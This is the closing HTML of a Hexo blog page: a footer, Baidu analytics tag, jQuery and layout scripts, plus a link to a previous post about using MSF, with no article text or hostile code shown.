            <a id="pageprev" href="/2023/12/25/MSF%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="article-prev" title="使用MSF需要注意的点"><i class="icon-arrow-left"></i></a>
            
        

        <footer class="footer">
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, Theme by <a href="https://github.com/sanonz/hexo-theme-concise" target="_blank">Concise</a>

    
    <script>
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?3f0e368eb1f22fb5a593be6193301ba9";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>
    
</footer>

    </main>

    <script type="text/javascript" src="https://unpkg.com/jquery@1.9.1/jquery.min.js"></script>
    <script type="text/javascript">
    $(function() {
        var nodes = {
            nav: $('#nav'),
            aside: $('#aside'),
            asideInner: $('#aside-inner'),
            navInner: $('#nav-inner')
        };

        var doing = false;
        nodes.asideInner.on('webkitAnimationEnd mozAnimationEnd oAnimationEnd oanimationend animationend', function() {
            if (nodes.aside.hasClass('mobile-open')) {
                nodes.aside.removeClass('mobile-open');
            } else {
                nodes.aside.removeClass('mobile-close panel-show');
            }
            doing = false;
        });
        $('#open-panel, #aside-mask').on('click', function() {
            if (doing) {
                return;
            }

            if (nodes.aside.hasClass('panel-show')) {
                nodes.aside.addClass('mobile-close');
            } else {
                nodes.aside.addClass('mobile-open panel-show');
            }
        });
        $('#open-menus').on('click', function() {
            nodes.navInner.slideToggle('normal', slideDone);
        });

        if (window.innerWidth <= 960) {
            setTimeout(function() {
                nodes.navInner.slideUp('normal', slideDone);
            }, 3000);
        }

        function slideDone() {
            if (nodes.navInner.css('display') !== 'none') {
                nodes.navInner.css('display', '');
            }
        }

        $(window).on('resize', function() {
            if ($(this).width() > 960) {
                nodes.navInner.css('display', '');
            }
        });
    });
    </script>
    
        
<script src="/js/scrollspy.min.js"></script>

        <script type="text/javascript">
        $(document.body).scrollspy({target: '#aside-inner'});

        $(window).on('resize', function() {
            var hw = $('#header').width();
            var ww = $('#wrapper').width();
            var space = ($(this).width() - hw - ww) / 2 / 2;

            var pageprev = $('#pageprev');
            var pagenext = $('#pagenext');
            var avg = (pageprev.width() + pagenext.width()) / 2

            if(space > avg) {
                var len = space - avg / 2;
                var styles = {position: 'fixed', top: '50%', marginTop: - (pageprev.width() + pagenext.width()) / 4}
                pageprev.css($.extend({left: hw + len}, styles));
                pagenext.css($.extend({right: len}, styles));
            } else {
                pageprev.removeAttr('style');
                pagenext.removeAttr('style');
            }
        }).trigger('resize');
        </script>
    

</body>
</html>
